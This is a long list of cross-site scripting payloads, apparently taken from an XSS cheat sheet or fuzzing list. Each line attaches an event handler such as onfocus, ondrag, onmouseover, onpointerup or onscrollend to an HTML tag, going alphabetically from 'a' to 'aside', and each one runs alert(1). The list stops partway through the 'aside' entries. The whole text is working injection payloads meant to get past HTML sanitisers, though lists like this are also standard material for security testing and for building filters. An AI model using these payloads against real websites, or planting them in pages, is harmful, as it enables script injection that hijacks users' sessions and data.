```js
<a autofocus onfocus=alert(1) href></a>
<a autofocus onfocusin=alert(1) href></a>
<a contenteditable onbeforeinput=alert(1)>test
<a draggable="true" ondrag="alert(1)" style=display:block>test</a>
<a draggable="true" ondragend="alert(1)" style=display:block>test</a>
<a draggable="true" ondragenter="alert(1)" style=display:block>test</a>
<a draggable="true" ondragleave="alert(1)" style=display:block>test</a>
<a draggable="true" ondragstart="alert(1)" style=display:block>test</a>
<a id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></a>
<a id=x tabindex=1 onfocus=alert(1)></a>
<a id=x tabindex=1 onfocusin=alert(1)></a>
<a onafterscriptexecute=alert(1)><script>1</script>
<a onbeforecopy="alert(1)" contenteditable>test</a>
<a onbeforecut="alert(1)" contenteditable>test</a>
<a onbeforescriptexecute=alert(1)><script>1</script>
<a onblur=alert(1) id=x tabindex=1 style=display:block>test</a><input value=clickme>
<a onclick="alert(1)" style=display:block>test</a>
<a oncontextmenu="alert(1)" style=display:block>test</a>
<a oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<a oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<a ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</a>
<a onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</a><input value=clickme>
<a onkeydown="alert(1)" contenteditable style=display:block>test</a>
<a onkeypress="alert(1)" contenteditable style=display:block>test</a>
<a onkeyup="alert(1)" contenteditable style=display:block>test</a>
<a onmousedown="alert(1)" style=display:block>test</a>
<a onmouseenter="alert(1)" style=display:block>test</a>
<a onmouseleave="alert(1)" style=display:block>test</a>
<a onmousemove="alert(1)" style=display:block>test</a>
<a onmouseout="alert(1)" style=display:block>test</a>
<a onmouseover="alert(1)" style=display:block>test</a>
<a onmouseup="alert(1)" style=display:block>test</a>
<a onmousewheel=alert(1) style=display:block>requires scrolling
<a onpaste="alert(1)" contenteditable>test</a>
<a onpointerdown=alert(1) style=display:block>XSS</a>
<a onpointerenter=alert(1) style=display:block>XSS</a>
<a onpointerleave=alert(1) style=display:block>XSS</a>
<a onpointermove=alert(1) style=display:block>XSS</a>
<a onpointerout=alert(1) style=display:block>XSS</a>
<a onpointerover=alert(1) style=display:block>XSS</a>
<a onpointerrawupdate=alert(1) style=display:block>XSS</a>
<a onpointerup=alert(1) style=display:block>XSS</a>
<a onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></a>
<a2 contenteditable onbeforeinput=alert(1)>test
<a2 draggable="true" ondrag="alert(1)" style=display:block>test</a2>
<a2 draggable="true" ondragend="alert(1)" style=display:block>test</a2>
<a2 draggable="true" ondragenter="alert(1)" style=display:block>test</a2>
<a2 draggable="true" ondragleave="alert(1)" style=display:block>test</a2>
<a2 draggable="true" ondragstart="alert(1)" style=display:block>test</a2>
<a2 id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></a2>
<a2 onafterscriptexecute=alert(1)><script>1</script>
<a2 onbeforescriptexecute=alert(1)><script>1</script>
<a2 onblur=alert(1) id=x tabindex=1 style=display:block>test</a2><input value=clickme>
<a2 onclick="alert(1)" style=display:block>test</a2>
<a2 oncontextmenu="alert(1)" style=display:block>test</a2>
<a2 oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<a2 oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<a2 ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</a2>
<a2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</a2><input value=clickme>
<a2 onkeydown="alert(1)" contenteditable style=display:block>test</a2>
<a2 onkeypress="alert(1)" contenteditable style=display:block>test</a2>
<a2 onkeyup="alert(1)" contenteditable style=display:block>test</a2>
<a2 onmousedown="alert(1)" style=display:block>test</a2>
<a2 onmouseenter="alert(1)" style=display:block>test</a2>
<a2 onmouseleave="alert(1)" style=display:block>test</a2>
<a2 onmousemove="alert(1)" style=display:block>test</a2>
<a2 onmouseout="alert(1)" style=display:block>test</a2>
<a2 onmouseover="alert(1)" style=display:block>test</a2>
<a2 onmouseup="alert(1)" style=display:block>test</a2>
<a2 onmousewheel=alert(1) style=display:block>requires scrolling
<a2 onpointerdown=alert(1) style=display:block>XSS</a2>
<a2 onpointerenter=alert(1) style=display:block>XSS</a2>
<a2 onpointerleave=alert(1) style=display:block>XSS</a2>
<a2 onpointermove=alert(1) style=display:block>XSS</a2>
<a2 onpointerout=alert(1) style=display:block>XSS</a2>
<a2 onpointerover=alert(1) style=display:block>XSS</a2>
<a2 onpointerrawupdate=alert(1) style=display:block>XSS</a2>
<a2 onpointerup=alert(1) style=display:block>XSS</a2>
<a2 onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></a2>
<abbr contenteditable onbeforeinput=alert(1)>test
<abbr draggable="true" ondrag="alert(1)" style=display:block>test</abbr>
<abbr draggable="true" ondragend="alert(1)" style=display:block>test</abbr>
<abbr draggable="true" ondragenter="alert(1)" style=display:block>test</abbr>
<abbr draggable="true" ondragleave="alert(1)" style=display:block>test</abbr>
<abbr draggable="true" ondragstart="alert(1)" style=display:block>test</abbr>
<abbr id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></abbr>
<abbr id=x tabindex=1 onfocus=alert(1)></abbr>
<abbr id=x tabindex=1 onfocusin=alert(1)></abbr>
<abbr onafterscriptexecute=alert(1)><script>1</script>
<abbr onbeforecopy="alert(1)" contenteditable>test</abbr>
<abbr onbeforecut="alert(1)" contenteditable>test</abbr>
<abbr onbeforescriptexecute=alert(1)><script>1</script>
<abbr onblur=alert(1) id=x tabindex=1 style=display:block>test</abbr><input value=clickme>
<abbr onclick="alert(1)" style=display:block>test</abbr>
<abbr oncontextmenu="alert(1)" style=display:block>test</abbr>
<abbr oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<abbr oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<abbr ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</abbr>
<abbr onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</abbr><input value=clickme>
<abbr onkeydown="alert(1)" contenteditable style=display:block>test</abbr>
<abbr onkeypress="alert(1)" contenteditable style=display:block>test</abbr>
<abbr onkeyup="alert(1)" contenteditable style=display:block>test</abbr>
<abbr onmousedown="alert(1)" style=display:block>test</abbr>
<abbr onmouseenter="alert(1)" style=display:block>test</abbr>
<abbr onmouseleave="alert(1)" style=display:block>test</abbr>
<abbr onmousemove="alert(1)" style=display:block>test</abbr>
<abbr onmouseout="alert(1)" style=display:block>test</abbr>
<abbr onmouseover="alert(1)" style=display:block>test</abbr>
<abbr onmouseup="alert(1)" style=display:block>test</abbr>
<abbr onmousewheel=alert(1) style=display:block>requires scrolling
<abbr onpaste="alert(1)" contenteditable>test</abbr>
<abbr onpointerdown=alert(1) style=display:block>XSS</abbr>
<abbr onpointerenter=alert(1) style=display:block>XSS</abbr>
<abbr onpointerleave=alert(1) style=display:block>XSS</abbr>
<abbr onpointermove=alert(1) style=display:block>XSS</abbr>
<abbr onpointerout=alert(1) style=display:block>XSS</abbr>
<abbr onpointerover=alert(1) style=display:block>XSS</abbr>
<abbr onpointerrawupdate=alert(1) style=display:block>XSS</abbr>
<abbr onpointerup=alert(1) style=display:block>XSS</abbr>
<abbr onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></abbr>
<acronym contenteditable onbeforeinput=alert(1)>test
<acronym draggable="true" ondrag="alert(1)" style=display:block>test</acronym>
<acronym draggable="true" ondragend="alert(1)" style=display:block>test</acronym>
<acronym draggable="true" ondragenter="alert(1)" style=display:block>test</acronym>
<acronym draggable="true" ondragleave="alert(1)" style=display:block>test</acronym>
<acronym draggable="true" ondragstart="alert(1)" style=display:block>test</acronym>
<acronym id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></acronym>
<acronym id=x tabindex=1 onfocus=alert(1)></acronym>
<acronym id=x tabindex=1 onfocusin=alert(1)></acronym>
<acronym onafterscriptexecute=alert(1)><script>1</script>
<acronym onbeforecopy="alert(1)" contenteditable>test</acronym>
<acronym onbeforecut="alert(1)" contenteditable>test</acronym>
<acronym onbeforescriptexecute=alert(1)><script>1</script>
<acronym onblur=alert(1) id=x tabindex=1 style=display:block>test</acronym><input value=clickme>
<acronym onclick="alert(1)" style=display:block>test</acronym>
<acronym oncontextmenu="alert(1)" style=display:block>test</acronym>
<acronym oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<acronym oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<acronym ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</acronym>
<acronym onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</acronym><input value=clickme>
<acronym onkeydown="alert(1)" contenteditable style=display:block>test</acronym>
<acronym onkeypress="alert(1)" contenteditable style=display:block>test</acronym>
<acronym onkeyup="alert(1)" contenteditable style=display:block>test</acronym>
<acronym onmousedown="alert(1)" style=display:block>test</acronym>
<acronym onmouseenter="alert(1)" style=display:block>test</acronym>
<acronym onmouseleave="alert(1)" style=display:block>test</acronym>
<acronym onmousemove="alert(1)" style=display:block>test</acronym>
<acronym onmouseout="alert(1)" style=display:block>test</acronym>
<acronym onmouseover="alert(1)" style=display:block>test</acronym>
<acronym onmouseup="alert(1)" style=display:block>test</acronym>
<acronym onmousewheel=alert(1) style=display:block>requires scrolling
<acronym onpaste="alert(1)" contenteditable>test</acronym>
<acronym onpointerdown=alert(1) style=display:block>XSS</acronym>
<acronym onpointerenter=alert(1) style=display:block>XSS</acronym>
<acronym onpointerleave=alert(1) style=display:block>XSS</acronym>
<acronym onpointermove=alert(1) style=display:block>XSS</acronym>
<acronym onpointerout=alert(1) style=display:block>XSS</acronym>
<acronym onpointerover=alert(1) style=display:block>XSS</acronym>
<acronym onpointerrawupdate=alert(1) style=display:block>XSS</acronym>
<acronym onpointerup=alert(1) style=display:block>XSS</acronym>
<acronym onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></acronym>
<address contenteditable onbeforeinput=alert(1)>test
<address draggable="true" ondrag="alert(1)" style=display:block>test</address>
<address draggable="true" ondragend="alert(1)" style=display:block>test</address>
<address draggable="true" ondragenter="alert(1)" style=display:block>test</address>
<address draggable="true" ondragleave="alert(1)" style=display:block>test</address>
<address draggable="true" ondragstart="alert(1)" style=display:block>test</address>
<address id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></address>
<address id=x tabindex=1 onfocus=alert(1)></address>
<address id=x tabindex=1 onfocusin=alert(1)></address>
<address onafterscriptexecute=alert(1)><script>1</script>
<address onbeforecopy="alert(1)" contenteditable>test</address>
<address onbeforecut="alert(1)" contenteditable>test</address>
<address onbeforescriptexecute=alert(1)><script>1</script>
<address onblur=alert(1) id=x tabindex=1 style=display:block>test</address><input value=clickme>
<address onclick="alert(1)" style=display:block>test</address>
<address oncontextmenu="alert(1)" style=display:block>test</address>
<address oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<address oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<address ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</address>
<address onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</address><input value=clickme>
<address onkeydown="alert(1)" contenteditable style=display:block>test</address>
<address onkeypress="alert(1)" contenteditable style=display:block>test</address>
<address onkeyup="alert(1)" contenteditable style=display:block>test</address>
<address onmousedown="alert(1)" style=display:block>test</address>
<address onmouseenter="alert(1)" style=display:block>test</address>
<address onmouseleave="alert(1)" style=display:block>test</address>
<address onmousemove="alert(1)" style=display:block>test</address>
<address onmouseout="alert(1)" style=display:block>test</address>
<address onmouseover="alert(1)" style=display:block>test</address>
<address onmouseup="alert(1)" style=display:block>test</address>
<address onmousewheel=alert(1) style=display:block>requires scrolling
<address onpaste="alert(1)" contenteditable>test</address>
<address onpointerdown=alert(1) style=display:block>XSS</address>
<address onpointerenter=alert(1) style=display:block>XSS</address>
<address onpointerleave=alert(1) style=display:block>XSS</address>
<address onpointermove=alert(1) style=display:block>XSS</address>
<address onpointerout=alert(1) style=display:block>XSS</address>
<address onpointerover=alert(1) style=display:block>XSS</address>
<address onpointerrawupdate=alert(1) style=display:block>XSS</address>
<address onpointerup=alert(1) style=display:block>XSS</address>
<address onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></address>
<animate contenteditable onbeforeinput=alert(1)>test
<animate draggable="true" ondrag="alert(1)" style=display:block>test</animate>
<animate draggable="true" ondragend="alert(1)" style=display:block>test</animate>
<animate draggable="true" ondragenter="alert(1)" style=display:block>test</animate>
<animate draggable="true" ondragleave="alert(1)" style=display:block>test</animate>
<animate draggable="true" ondragstart="alert(1)" style=display:block>test</animate>
<animate id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></animate>
<animate onafterscriptexecute=alert(1)><script>1</script>
<animate onbeforescriptexecute=alert(1)><script>1</script>
<animate onblur=alert(1) id=x tabindex=1 style=display:block>test</animate><input value=clickme>
<animate onclick="alert(1)" style=display:block>test</animate>
<animate oncontextmenu="alert(1)" style=display:block>test</animate>
<animate oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<animate oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<animate ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</animate>
<animate onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</animate><input value=clickme>
<animate onkeydown="alert(1)" contenteditable style=display:block>test</animate>
<animate onkeypress="alert(1)" contenteditable style=display:block>test</animate>
<animate onkeyup="alert(1)" contenteditable style=display:block>test</animate>
<animate onmousedown="alert(1)" style=display:block>test</animate>
<animate onmouseenter="alert(1)" style=display:block>test</animate>
<animate onmouseleave="alert(1)" style=display:block>test</animate>
<animate onmousemove="alert(1)" style=display:block>test</animate>
<animate onmouseout="alert(1)" style=display:block>test</animate>
<animate onmouseover="alert(1)" style=display:block>test</animate>
<animate onmouseup="alert(1)" style=display:block>test</animate>
<animate onmousewheel=alert(1) style=display:block>requires scrolling
<animate onpointerdown=alert(1) style=display:block>XSS</animate>
<animate onpointerenter=alert(1) style=display:block>XSS</animate>
<animate onpointerleave=alert(1) style=display:block>XSS</animate>
<animate onpointermove=alert(1) style=display:block>XSS</animate>
<animate onpointerout=alert(1) style=display:block>XSS</animate>
<animate onpointerover=alert(1) style=display:block>XSS</animate>
<animate onpointerrawupdate=alert(1) style=display:block>XSS</animate>
<animate onpointerup=alert(1) style=display:block>XSS</animate>
<animate onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></animate>
<animatemotion contenteditable onbeforeinput=alert(1)>test
<animatemotion draggable="true" ondrag="alert(1)" style=display:block>test</animatemotion>
<animatemotion draggable="true" ondragend="alert(1)" style=display:block>test</animatemotion>
<animatemotion draggable="true" ondragenter="alert(1)" style=display:block>test</animatemotion>
<animatemotion draggable="true" ondragleave="alert(1)" style=display:block>test</animatemotion>
<animatemotion draggable="true" ondragstart="alert(1)" style=display:block>test</animatemotion>
<animatemotion id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></animatemotion>
<animatemotion onafterscriptexecute=alert(1)><script>1</script>
<animatemotion onbeforescriptexecute=alert(1)><script>1</script>
<animatemotion onblur=alert(1) id=x tabindex=1 style=display:block>test</animatemotion><input value=clickme>
<animatemotion onclick="alert(1)" style=display:block>test</animatemotion>
<animatemotion oncontextmenu="alert(1)" style=display:block>test</animatemotion>
<animatemotion oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<animatemotion oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<animatemotion ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</animatemotion>
<animatemotion onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</animatemotion><input value=clickme>
<animatemotion onkeydown="alert(1)" contenteditable style=display:block>test</animatemotion>
<animatemotion onkeypress="alert(1)" contenteditable style=display:block>test</animatemotion>
<animatemotion onkeyup="alert(1)" contenteditable style=display:block>test</animatemotion>
<animatemotion onmousedown="alert(1)" style=display:block>test</animatemotion>
<animatemotion onmouseenter="alert(1)" style=display:block>test</animatemotion>
<animatemotion onmouseleave="alert(1)" style=display:block>test</animatemotion>
<animatemotion onmousemove="alert(1)" style=display:block>test</animatemotion>
<animatemotion onmouseout="alert(1)" style=display:block>test</animatemotion>
<animatemotion onmouseover="alert(1)" style=display:block>test</animatemotion>
<animatemotion onmouseup="alert(1)" style=display:block>test</animatemotion>
<animatemotion onmousewheel=alert(1) style=display:block>requires scrolling
<animatemotion onpointerdown=alert(1) style=display:block>XSS</animatemotion>
<animatemotion onpointerenter=alert(1) style=display:block>XSS</animatemotion>
<animatemotion onpointerleave=alert(1) style=display:block>XSS</animatemotion>
<animatemotion onpointermove=alert(1) style=display:block>XSS</animatemotion>
<animatemotion onpointerout=alert(1) style=display:block>XSS</animatemotion>
<animatemotion onpointerover=alert(1) style=display:block>XSS</animatemotion>
<animatemotion onpointerrawupdate=alert(1) style=display:block>XSS</animatemotion>
<animatemotion onpointerup=alert(1) style=display:block>XSS</animatemotion>
<animatemotion onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></animatemotion>
<animatetransform contenteditable onbeforeinput=alert(1)>test
<animatetransform draggable="true" ondrag="alert(1)" style=display:block>test</animatetransform>
<animatetransform draggable="true" ondragend="alert(1)" style=display:block>test</animatetransform>
<animatetransform draggable="true" ondragenter="alert(1)" style=display:block>test</animatetransform>
<animatetransform draggable="true" ondragleave="alert(1)" style=display:block>test</animatetransform>
<animatetransform draggable="true" ondragstart="alert(1)" style=display:block>test</animatetransform>
<animatetransform id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></animatetransform>
<animatetransform onafterscriptexecute=alert(1)><script>1</script>
<animatetransform onbeforescriptexecute=alert(1)><script>1</script>
<animatetransform onblur=alert(1) id=x tabindex=1 style=display:block>test</animatetransform><input value=clickme>
<animatetransform onclick="alert(1)" style=display:block>test</animatetransform>
<animatetransform oncontextmenu="alert(1)" style=display:block>test</animatetransform>
<animatetransform oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<animatetransform oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<animatetransform ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</animatetransform>
<animatetransform onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</animatetransform><input value=clickme>
<animatetransform onkeydown="alert(1)" contenteditable style=display:block>test</animatetransform>
<animatetransform onkeypress="alert(1)" contenteditable style=display:block>test</animatetransform>
<animatetransform onkeyup="alert(1)" contenteditable style=display:block>test</animatetransform>
<animatetransform onmousedown="alert(1)" style=display:block>test</animatetransform>
<animatetransform onmouseenter="alert(1)" style=display:block>test</animatetransform>
<animatetransform onmouseleave="alert(1)" style=display:block>test</animatetransform>
<animatetransform onmousemove="alert(1)" style=display:block>test</animatetransform>
<animatetransform onmouseout="alert(1)" style=display:block>test</animatetransform>
<animatetransform onmouseover="alert(1)" style=display:block>test</animatetransform>
<animatetransform onmouseup="alert(1)" style=display:block>test</animatetransform>
<animatetransform onmousewheel=alert(1) style=display:block>requires scrolling
<animatetransform onpointerdown=alert(1) style=display:block>XSS</animatetransform>
<animatetransform onpointerenter=alert(1) style=display:block>XSS</animatetransform>
<animatetransform onpointerleave=alert(1) style=display:block>XSS</animatetransform>
<animatetransform onpointermove=alert(1) style=display:block>XSS</animatetransform>
<animatetransform onpointerout=alert(1) style=display:block>XSS</animatetransform>
<animatetransform onpointerover=alert(1) style=display:block>XSS</animatetransform>
<animatetransform onpointerrawupdate=alert(1) style=display:block>XSS</animatetransform>
<animatetransform onpointerup=alert(1) style=display:block>XSS</animatetransform>
<animatetransform onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></animatetransform>
<applet contenteditable onbeforeinput=alert(1)>test
<applet draggable="true" ondrag="alert(1)" style=display:block>test</applet>
<applet draggable="true" ondragend="alert(1)" style=display:block>test</applet>
<applet draggable="true" ondragenter="alert(1)" style=display:block>test</applet>
<applet draggable="true" ondragleave="alert(1)" style=display:block>test</applet>
<applet draggable="true" ondragstart="alert(1)" style=display:block>test</applet>
<applet id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></applet>
<applet id=x tabindex=1 onfocus=alert(1)></applet>
<applet id=x tabindex=1 onfocusin=alert(1)></applet>
<applet onafterscriptexecute=alert(1)><script>1</script>
<applet onbeforecopy="alert(1)" contenteditable>test</applet>
<applet onbeforecut="alert(1)" contenteditable>test</applet>
<applet onbeforescriptexecute=alert(1)><script>1</script>
<applet onblur=alert(1) id=x tabindex=1 style=display:block>test</applet><input value=clickme>
<applet onclick="alert(1)" style=display:block>test</applet>
<applet oncontextmenu="alert(1)" style=display:block>test</applet>
<applet oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<applet oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<applet ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</applet>
<applet onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</applet><input value=clickme>
<applet onkeydown="alert(1)" contenteditable style=display:block>test</applet>
<applet onkeypress="alert(1)" contenteditable style=display:block>test</applet>
<applet onkeyup="alert(1)" contenteditable style=display:block>test</applet>
<applet onmousedown="alert(1)" style=display:block>test</applet>
<applet onmouseenter="alert(1)" style=display:block>test</applet>
<applet onmouseleave="alert(1)" style=display:block>test</applet>
<applet onmousemove="alert(1)" style=display:block>test</applet>
<applet onmouseout="alert(1)" style=display:block>test</applet>
<applet onmouseover="alert(1)" style=display:block>test</applet>
<applet onmouseup="alert(1)" style=display:block>test</applet>
<applet onmousewheel=alert(1) style=display:block>requires scrolling
<applet onpaste="alert(1)" contenteditable>test</applet>
<applet onpointerdown=alert(1) style=display:block>XSS</applet>
<applet onpointerenter=alert(1) style=display:block>XSS</applet>
<applet onpointerleave=alert(1) style=display:block>XSS</applet>
<applet onpointermove=alert(1) style=display:block>XSS</applet>
<applet onpointerout=alert(1) style=display:block>XSS</applet>
<applet onpointerover=alert(1) style=display:block>XSS</applet>
<applet onpointerrawupdate=alert(1) style=display:block>XSS</applet>
<applet onpointerup=alert(1) style=display:block>XSS</applet>
<applet onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></applet>
<area contenteditable onbeforeinput=alert(1)>test
<area draggable="true" ondrag="alert(1)" style=display:block>test</area>
<area draggable="true" ondragend="alert(1)" style=display:block>test</area>
<area draggable="true" ondragenter="alert(1)" style=display:block>test</area>
<area draggable="true" ondragleave="alert(1)" style=display:block>test</area>
<area draggable="true" ondragstart="alert(1)" style=display:block>test</area>
<area id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></area>
<area onafterscriptexecute=alert(1)><script>1</script>
<area onbeforecopy="alert(1)" contenteditable>test</area>
<area onbeforecut="alert(1)" contenteditable>test</area>
<area onbeforescriptexecute=alert(1)><script>1</script>
<area onblur=alert(1) id=x tabindex=1 style=display:block>test</area><input value=clickme>
<area onclick="alert(1)" style=display:block>test</area>
<area oncontextmenu="alert(1)" style=display:block>test</area>
<area oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<area oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<area ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</area>
<area onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</area><input value=clickme>
<area onkeydown="alert(1)" contenteditable style=display:block>test</area>
<area onkeypress="alert(1)" contenteditable style=display:block>test</area>
<area onkeyup="alert(1)" contenteditable style=display:block>test</area>
<area onmousedown="alert(1)" style=display:block>test</area>
<area onmouseenter="alert(1)" style=display:block>test</area>
<area onmouseleave="alert(1)" style=display:block>test</area>
<area onmousemove="alert(1)" style=display:block>test</area>
<area onmouseout="alert(1)" style=display:block>test</area>
<area onmouseover="alert(1)" style=display:block>test</area>
<area onmouseup="alert(1)" style=display:block>test</area>
<area onmousewheel=alert(1) style=display:block>requires scrolling
<area onpaste="alert(1)" contenteditable>test</area>
<area onpointerdown=alert(1) style=display:block>XSS</area>
<area onpointerenter=alert(1) style=display:block>XSS</area>
<area onpointerleave=alert(1) style=display:block>XSS</area>
<area onpointermove=alert(1) style=display:block>XSS</area>
<area onpointerout=alert(1) style=display:block>XSS</area>
<area onpointerover=alert(1) style=display:block>XSS</area>
<area onpointerrawupdate=alert(1) style=display:block>XSS</area>
<area onpointerup=alert(1) style=display:block>XSS</area>
<area onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></area>
<article contenteditable onbeforeinput=alert(1)>test
<article draggable="true" ondrag="alert(1)" style=display:block>test</article>
<article draggable="true" ondragend="alert(1)" style=display:block>test</article>
<article draggable="true" ondragenter="alert(1)" style=display:block>test</article>
<article draggable="true" ondragleave="alert(1)" style=display:block>test</article>
<article draggable="true" ondragstart="alert(1)" style=display:block>test</article>
<article id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></article>
<article id=x tabindex=1 onfocus=alert(1)></article>
<article id=x tabindex=1 onfocusin=alert(1)></article>
<article onafterscriptexecute=alert(1)><script>1</script>
<article onbeforecopy="alert(1)" contenteditable>test</article>
<article onbeforecut="alert(1)" contenteditable>test</article>
<article onbeforescriptexecute=alert(1)><script>1</script>
<article onblur=alert(1) id=x tabindex=1 style=display:block>test</article><input value=clickme>
<article onclick="alert(1)" style=display:block>test</article>
<article oncontextmenu="alert(1)" style=display:block>test</article>
<article oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<article oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<article ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</article>
<article onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</article><input value=clickme>
<article onkeydown="alert(1)" contenteditable style=display:block>test</article>
<article onkeypress="alert(1)" contenteditable style=display:block>test</article>
<article onkeyup="alert(1)" contenteditable style=display:block>test</article>
<article onmousedown="alert(1)" style=display:block>test</article>
<article onmouseenter="alert(1)" style=display:block>test</article>
<article onmouseleave="alert(1)" style=display:block>test</article>
<article onmousemove="alert(1)" style=display:block>test</article>
<article onmouseout="alert(1)" style=display:block>test</article>
<article onmouseover="alert(1)" style=display:block>test</article>
<article onmouseup="alert(1)" style=display:block>test</article>
<article onmousewheel=alert(1) style=display:block>requires scrolling
<article onpaste="alert(1)" contenteditable>test</article>
<article onpointerdown=alert(1) style=display:block>XSS</article>
<article onpointerenter=alert(1) style=display:block>XSS</article>
<article onpointerleave=alert(1) style=display:block>XSS</article>
<article onpointermove=alert(1) style=display:block>XSS</article>
<article onpointerout=alert(1) style=display:block>XSS</article>
<article onpointerover=alert(1) style=display:block>XSS</article>
<article onpointerrawupdate=alert(1) style=display:block>XSS</article>
<article onpointerup=alert(1) style=display:block>XSS</article>
<article onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></article>
<aside contenteditable onbeforeinput=alert(1)>test
<aside draggable="true" ondrag="alert(1)" style=display:block>test</aside>
<aside draggable="true" ondragend="alert(1)" style=display:block>test</aside>
<aside draggable="true" ondragenter="alert(1)" style=display:block>test</aside>
<aside draggable="true" ondragleave="alert(1)" style=display:block>test</aside>
<aside draggable="true" ondragstart="alert(1)" style=display:block>test</aside>
<aside id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></aside>
<aside id=x tabindex=1 onfocus=alert(1)></aside>
<aside id=x tabindex=1 onfocusin=alert(1)></aside>
<aside onafterscriptexecute=alert(1)><script>1</script>
<aside onbeforecopy="alert(1)" contenteditable>test</aside>
<aside onbeforecut="alert(1)" contenteditable>test</aside>
<aside onbeforescriptexecute=alert(1)><script>1</script>
<aside onblur=alert(1) id=x tabindex=1 style=display:block>test</aside><input value=clickme>
<aside onclick="alert(1)" style=display:block>test</aside>
